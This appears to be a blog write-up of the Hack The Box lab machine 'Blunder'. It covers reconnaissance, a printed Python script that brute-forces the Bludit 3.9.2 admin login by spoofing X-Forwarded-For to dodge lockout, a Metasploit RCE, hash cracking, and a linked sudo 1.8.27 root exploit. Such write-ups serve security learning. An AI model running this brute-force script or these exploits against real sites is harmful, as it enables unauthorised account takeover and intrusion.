<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>blunder</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  <script></script>
</head>
<body><div class="page"><h1 class="title"><img src="{{site.baseurl}}/assets/images/blunder/blunder.png" /></h1><br/>This is a very easy, and straightforward linux box<br /><br />nmap shows that only http (80) is open<img src="{{site.baseurl}}/assets/images/blunder/1-1.png" alt="{{site.baseurl}}/assets/images/blunder/1-1.png" /><br /><br />this is how the website looks like<br /><img src="{{site.baseurl}}/assets/images/blunder/1-2.png" alt="{{site.baseurl}}/assets/images/blunder/1-2.png" /><br /><br />since theres nothing else to look at, i did a directory scan with gobuster<br /><img src="{{site.baseurl}}/assets/images/blunder/1-3.png" alt="{{site.baseurl}}/assets/images/blunder/1-3.png" /><br /><br />so we have an admin panel for the CMS and a todo.txt<br /><img src="{{site.baseurl}}/assets/images/blunder/1-4.png" alt="{{site.baseurl}}/assets/images/blunder/1-4.png" /> <img src="{{site.baseurl}}/assets/images/blunder/1-5.png" alt="{{site.baseurl}}/assets/images/blunder/1-5.png" /><br /><br />theres a username in the todo file, im assuming we use for the admin panel. i went through the source of the admin panel, to find a version and sure enough its Bludit 3.9.2<br /><img src="{{site.baseurl}}/assets/images/blunder/1-6.png" alt="{{site.baseurl}}/assets/images/blunder/1-6.png" /><br /><br />i tried bruteforcing the login page, with burp and default wordlists like rockyou but it was of no use. Went through some hints on htb forums and a user said that the bruteforce way is correct, but the password is not in any wordlist but right infront of you<br /><br />so i used CeWL, a web crawler that searches for interesting words and compiles them into a wordlist<br /><div class="codebox"><div class="codebox">cewl&nbsp;-d&nbsp;2&nbsp;10.10.10.191<br /><span style="color:#ff9d00;font-weight:700">//</span>this&nbsp;searches&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">a</span>&nbsp;depth&nbsp;of&nbsp;2</div></div><br /><br />but that wordlist didnt work either.... but as stated earlier, bruteforce was the right way in. So perhaps there is a different way to bruteforce?<br />a quick google revealed this <a href="https://medium.com/@musyokaian/bludit-cms-version-3-9-2-brute-force-protection-bypass-283f39a84bbb">bruteforce exploit for bludit 3.9.2</a><br /><br /><div class="codebox"><div class="codebox"><span style="color:#333333;font-weight:400">import</span>&nbsp;requests&nbsp;<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;requests<br /><span style="color:#0088ff;font-weight:400">#from&nbsp;__future__&nbsp;import&nbsp;print_function</span><br /><br />def&nbsp;replace(file_path):<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;[item.replace(<span style="color:#3ad900;font-weight:400">"\n"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">""</span>)&nbsp;for&nbsp;item&nbsp;in&nbsp;open(file_path).readlines()]<br /><br />host&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'http://10.10.10.191'</span><br />login_url&nbsp;=&nbsp;host&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">'/admin/login'</span><br />username&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'fergus'</span><br />wordlist&nbsp;=&nbsp;replace(<span style="color:#3ad900;font-weight:400">'/root/htb/blunder/pass.txt'</span>)<br /><br />for&nbsp;password&nbsp;in&nbsp;wordlist:<br />&nbsp;&nbsp;&nbsp;&nbsp;session&nbsp;=&nbsp;requests.Session()<br />&nbsp;&nbsp;&nbsp;&nbsp;login_page&nbsp;=&nbsp;session.get(login_url)<br />&nbsp;&nbsp;&nbsp;&nbsp;csrf_token&nbsp;=&nbsp;re.search(<span style="color:#3ad900;font-weight:400">'input.+?name="tokenCSRF".+?value="(.+?)"'</span>,&nbsp;login_page.text).group(<span style="color:#ff0044;font-weight:400">1</span>)<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>(<span style="color:#3ad900;font-weight:400">'[*]&nbsp;Trying:&nbsp;{p}'</span>.format(p&nbsp;=&nbsp;password))<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;headers&nbsp;=&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">'X-Forwarded-For'</span>:&nbsp;password,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">'User-Agent'</span>:&nbsp;<span style="color:#3ad900;font-weight:400">'Mozilla/5.0&nbsp;(X11;&nbsp;Linux&nbsp;x86_64)&nbsp;AppleWebKit/537.36&nbsp;(KHTML,&nbsp;like&nbsp;Gecko)&nbsp;Chrome/77.0.3865.90&nbsp;Safari/537.36'</span>,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">'Referer'</span>:&nbsp;login_url<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">'tokenCSRF'</span>:&nbsp;csrf_token,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">'username'</span>:&nbsp;username,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">'password'</span>:&nbsp;password,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">'save'</span>:&nbsp;<span style="color:#3ad900;font-weight:400">''</span><br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;login_result&nbsp;=&nbsp;session.post(login_url,&nbsp;headers&nbsp;=&nbsp;headers,&nbsp;data&nbsp;=&nbsp;data,&nbsp;allow_redirects&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">False</span>)<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;<span style="color:#3ad900;font-weight:400">'location'</span>&nbsp;in&nbsp;login_result.headers:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;<span style="color:#3ad900;font-weight:400">'/admin/dashboard'</span>&nbsp;in&nbsp;login_result.headers[<span style="color:#3ad900;font-weight:400">'location'</span>]:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>(<span style="color:#3ad900;font-weight:400">'SUCCESS:&nbsp;Password&nbsp;found!'</span>)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>(<span style="color:#3ad900;font-weight:400">'Use&nbsp;{u}:{p}&nbsp;to&nbsp;login.'</span>.format(u&nbsp;=&nbsp;username,&nbsp;p&nbsp;=&nbsp;password))<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break<br /></div></div><br /><br />ran the exploit and it worked like a charm<br /><img src="{{site.baseurl}}/assets/images/blunder/1-7.png" alt="{{site.baseurl}}/assets/images/blunder/1-7.png" /><br /><br />we can now login to the CMS<br /><img src="{{site.baseurl}}/assets/images/blunder/1-8.png" alt="{{site.baseurl}}/assets/images/blunder/1-8.png" /><br /><br />theres another exploit for bludit that i came across earlier, a msf module for an RCE that required credentials<br />since now we have valid credentials, we can use  that to get a shell <br /><br /><img src="{{site.baseurl}}/assets/images/blunder/1-9.png" alt="{{site.baseurl}}/assets/images/blunder/1-9.png" /><br /><br />i looked around and noticed another version of bludit (bludit-3.10.0a) was installed on the box, in which i found a hash for hugo in /var/www/bludit-3.10.0a/bl-content/databases/users.php<br /><br />i tried to crack it with hashcat and john as well, but both kept aborting sessions. so i cracked it on an online tool<br /><img src="{{site.baseurl}}/assets/images/blunder/1-10.png" alt="{{site.baseurl}}/assets/images/blunder/1-10.png" /><br /><br />and we own user<br /><img src="{{site.baseurl}}/assets/images/blunder/1-11.png" alt="{{site.baseurl}}/assets/images/blunder/1-11.png" /><br /><br />i tried sudo -l and the output i got was somewhat weird<br /><img src="{{site.baseurl}}/assets/images/blunder/1-12.png" alt="{{site.baseurl}}/assets/images/blunder/1-12.png" /><br /><br />usually it looks something like "(ALL : ALL) ALL" or permitted binaries are displayed<br />i googled that line and found an <a href="https://www.exploit-db.com/exploits/47502">exploit for sudo 1.8.27</a><br /><br /><img src="{{site.baseurl}}/assets/images/blunder/1-13.png" alt="{{site.baseurl}}/assets/images/blunder/1-13.png" /><br /><br />we have root</div></body></html>
